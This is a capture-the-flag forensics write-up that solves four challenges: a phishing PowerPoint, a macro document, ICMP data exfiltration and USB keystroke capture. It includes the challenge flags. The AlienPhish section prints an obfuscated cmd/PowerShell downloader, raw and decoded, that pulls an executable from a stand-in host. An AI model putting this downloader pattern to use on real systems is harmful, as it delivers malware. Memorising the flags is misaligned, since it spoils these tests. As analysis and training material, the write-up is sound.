# Forensics

## AlienPhish

* Unzip and find 'Alien Weaknesses.pptx'
* Unzip again and go to ppt/slides/_rels/
* Read slide1.xml.rels to find a suspicious relation tag

```
    cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
```

* Go to cyberchef 
* From url decode 
* Reverse 

```
    "%=!XCk*:XCk% llac 0 qel X% fi;pma&;pma&!1,X%~:My!!XCk!=XCk tes od)0;1-;221( ni X% L/ rof;pma&;pma&powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o"=My tes"C/NO:V/ exe.dmc
```

```
    Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99
```

* From base64 and select the urlSafe alphabet

```
CHTB{pH1sHiNg_w0_m4cr0s???}
```

## Invitation

* So we get a docm file. 
* I start by unzippping the word document 
* We get a docm
* Unzip it again and see folders

![](https://i.imgur.com/QGNpoAN.jpg)

**PART 1**

* First thing I tried to do after looking around was 

```bash
strings vbaProject.bin
```

* Which gives back interesting hex lines. 

![](https://i.imgur.com/wCwsViH.jpg)

* Then decrypt from hex

![](https://i.imgur.com/J3GgsHy.jpg)

* From base64 urlsafe alphabet will show the following 

![](https://i.imgur.com/fFXAvG7.jpg)

```
CHTB{maldocs_are
```

**PART 2**

* Upload full vbaProject file this time and do the same as before. 

![](https://i.imgur.com/emzaocw.jpg)

* Use base64 urlsafe alphabet
* We get second part of the flag by reversing

```
_the_new_meta}
```
```
CHTB{maldocs_are_the_new_meta}
```

---

## Oldest trick in the book

* We are given a pcap which consists of mostly TLS and ICMP traffic
* ICMP looks promising as we can see the header of ZIP file `PK`

![](https://i.imgur.com/psF5J8t.png)

* Another thing was that the the traffic from both IP address was similar I focused on only one of them


![](https://i.imgur.com/SO5HeaA.png)

* To extract data of all these packets I used tshark

```bash
$ tshark -r older_trick.pcap -T fields -e data.data -Y "ip.src == 192.168.1.7" > 192.168.1.7.txt
```

* After this I looked for duplicate packets in the text file

![](https://i.imgur.com/WA0vh5A.png)

* So we have 10127 unique icmp data packets
* To decode hex and compile all the data I created a small python script
* But I was not getting proper file format of resultant file so I inspected the data
* There were duplicates in the data as well!

```
b7ae04 0000000000 504b0304140000000000729e8d52659b 504b0304140000000000729e8d52659b 504b030414000000
ead104 0000000000 4c6b1800000018000000100000006669 4c6b1800000018000000100000006669 4c6b180000001800
99e804 0000000000 6e692f6164646f6e732e6a736f6e7b22 6e692f6164646f6e732e6a736f6e7b22 6e692f6164646f6e
cafb04 0000000000 736368656d61223a362c226164646f6e 736368656d61223a362c226164646f6e 736368656d61223a
```

* This is the data from first 4 packets for an example
* After first 6 characters we have 10 zeroes
* After that a unique string
* The string is repeated after that
* Then a partial repetition can be seen at the end
* I tried various combinations and in the end only the unique string was needed from each packet i.e `504b0304140000000000729e8d52659b` for first line as an example

```python
#!/usr/bin/env python3
import binascii
msg = []
with open('unique.txt', 'r') as raw:
    raw_arr = raw.readlines()
for line in raw_arr:
    if len(line) == 97:
        line = line.strip()
        line = line[16:48]
        plain = binascii.unhexlify(line)
        msg.append(plain)
with open('result.zip', 'wb') as res:
    for line in msg:
        res.write(line)
```

* The script iterates over each line in the file and skips empty lines if it finds any
* Then it slices of extra characters as stated above
* Then it decodes the hex into binary data and appends it in a file

![](https://i.imgur.com/Wp40hSP.png)

* And we get a proper zip file!
* Here are the extracted contents of the zip

![](https://i.imgur.com/S6eNZKm.png)

* After some enumeration of all files they point towards Mozilla Firefox
* After some googling I found that this is a firefox profile dump
* In linux the default path for profiles is `/home/user/.mozilla/firefox`
* I copied the folder into profiles folder and then edited the `profiles.ini` file present inside it to add the following entry

```
[Profile2]
Name=fini
Path=fini
IsRelative=1
```

* After this I launched firefox from CLI using 

```bash
$ firefox -P
```

* It provides an option to choose a specific profile and launch the browser with it

![](https://i.imgur.com/IlXQ7fN.png)

* After the browser launched with the new profile and checked the saved logins and here we have the flag!

![](https://i.imgur.com/hixB18Q.png)

---

## Key Mission

>The secretary of earth defense has been kidnapped. We have sent our elite team on the enemy's base to find his location. Our team only managed to intercept this traffic. Your mission is to retrieve secretary's hidden location.

firstly extracted the values by 
```
tshark -r key_mission.pcap -T fields -e usb.capdata | tr -d : > test.txt 
python test.py test.txt  
```

used the following code from [here](https://blog.stayontarget.org/2019/03/decoding-mixed-case-usb-keystrokes-from.html)

```
#!/usr/bin/python
# coding: utf-8
from __future__ import print_function
import sys,os

#declare -A lcasekey
lcasekey = {}
#declare -A ucasekey
ucasekey = {}

#associate USB HID scan codes with keys
#ex: key 4  can be both "a" and "A", depending on if SHIFT is held down
lcasekey[4]="a";           ucasekey[4]="A"
lcasekey[5]="b";           ucasekey[5]="B"
lcasekey[6]="c";           ucasekey[6]="C"
lcasekey[7]="d";           ucasekey[7]="D"
lcasekey[8]="e";           ucasekey[8]="E"
lcasekey[9]="f";           ucasekey[9]="F"
lcasekey[10]="g";          ucasekey[10]="G"
lcasekey[11]="h";          ucasekey[11]="H"
lcasekey[12]="i";          ucasekey[12]="I"
lcasekey[13]="j";          ucasekey[13]="J"
lcasekey[14]="k";          ucasekey[14]="K"
lcasekey[15]="l";          ucasekey[15]="L"
lcasekey[16]="m";          ucasekey[16]="M"
lcasekey[17]="n";          ucasekey[17]="N"
lcasekey[18]="o";          ucasekey[18]="O"
lcasekey[19]="p";          ucasekey[19]="P"
lcasekey[20]="q";          ucasekey[20]="Q"
lcasekey[21]="r";          ucasekey[21]="R"
lcasekey[22]="s";          ucasekey[22]="S"
lcasekey[23]="t";          ucasekey[23]="T"
lcasekey[24]="u";          ucasekey[24]="U"
lcasekey[25]="v";          ucasekey[25]="V"
lcasekey[26]="w";          ucasekey[26]="W"
lcasekey[27]="x";          ucasekey[27]="X"
lcasekey[28]="y";          ucasekey[28]="Y"
lcasekey[29]="z";          ucasekey[29]="Z"
lcasekey[30]="1";          ucasekey[30]="!"
lcasekey[31]="2";          ucasekey[31]="@"
lcasekey[32]="3";          ucasekey[32]="#"
lcasekey[33]="4";          ucasekey[33]="$"
lcasekey[34]="5";          ucasekey[34]="%"
lcasekey[35]="6";          ucasekey[35]="^"
lcasekey[36]="7";          ucasekey[36]="&"
lcasekey[37]="8";          ucasekey[37]="*"
lcasekey[38]="9";          ucasekey[38]="("
lcasekey[39]="0";          ucasekey[39]=")"
lcasekey[40]="Enter";      ucasekey[40]="Enter"
lcasekey[41]="esc";        ucasekey[41]="esc"
lcasekey[42]="del";        ucasekey[42]="del"
lcasekey[43]="tab";        ucasekey[43]="tab"
lcasekey[44]="space";      ucasekey[44]="space"
lcasekey[45]="-";          ucasekey[45]="_"
lcasekey[46]="=";          ucasekey[46]="+"
lcasekey[47]="[";          ucasekey[47]="{"
lcasekey[48]="]";          ucasekey[48]="}"
lcasekey[49]="\\";         ucasekey[49]="|"
lcasekey[50]=" ";          ucasekey[50]=" "
lcasekey[51]=";";          ucasekey[51]=":"
lcasekey[52]="'";          ucasekey[52]="\""
lcasekey[53]="`";          ucasekey[53]="~"
lcasekey[54]=",";          ucasekey[54]="<"
lcasekey[55]=".";          ucasekey[55]=">"
lcasekey[56]="/";          ucasekey[56]="?"
lcasekey[57]="CapsLock";   ucasekey[57]="CapsLock"
lcasekey[79]="RightArrow"; ucasekey[79]="RightArrow"
lcasekey[80]="LeftArrow";  ucasekey[80]="LeftArrow"
lcasekey[84]="/";          ucasekey[84]="/"
lcasekey[85]="*";          ucasekey[85]="*"
lcasekey[86]="-";          ucasekey[86]="-"
lcasekey[87]="+";          ucasekey[87]="+"
lcasekey[88]="Enter";      ucasekey[88]="Enter"
lcasekey[89]="1";          ucasekey[89]="1"
lcasekey[90]="2";          ucasekey[90]="2"
lcasekey[91]="3";          ucasekey[91]="3"
lcasekey[92]="4";          ucasekey[92]="4"
lcasekey[93]="5";          ucasekey[93]="5"
lcasekey[94]="6";          ucasekey[94]="6"
lcasekey[95]="7";          ucasekey[95]="7"
lcasekey[96]="8";          ucasekey[96]="8"
lcasekey[97]="9";          ucasekey[97]="9"
lcasekey[98]="0";          ucasekey[98]="0"
lcasekey[99]=".";          ucasekey[99]="."

#make sure filename to open has been provided
if len(sys.argv) == 2:
	keycodes = open(sys.argv[1])
	for line in keycodes:
		#dump line to bytearray
		bytesArray = bytearray.fromhex(line.strip())
		#see if we have a key code
		val = int(bytesArray[2])
		if val > 3 and val < 100:
			#see if left shift or right shift was held down
			if bytesArray[0] == 0x02 or bytesArray[0] == 0x20 :
				print(ucasekey[int(bytesArray[2])], end=''),  #single line output
				#print(ucasekey[int(bytesArray[2])])            #newline output
			else:
				print(lcasekey[int(bytesArray[2])], end=''),  #single line output
				#print(lcasekey[int(bytesArray[2])])            #newline output
else:
    print("USAGE: python %s [filename]" % os.path.basename(__file__))
```

>CHTB{a_place=3deldel-3deldel_3deldeldel3_fAr_fAar_awway_ffr0m_eearth}

but i had to actually DEL from the left side of each "del", also there was an extra "a" in "FAar"

>CHTB{a_plac3_fAr_fAr_awway_ffr0m_eearth}
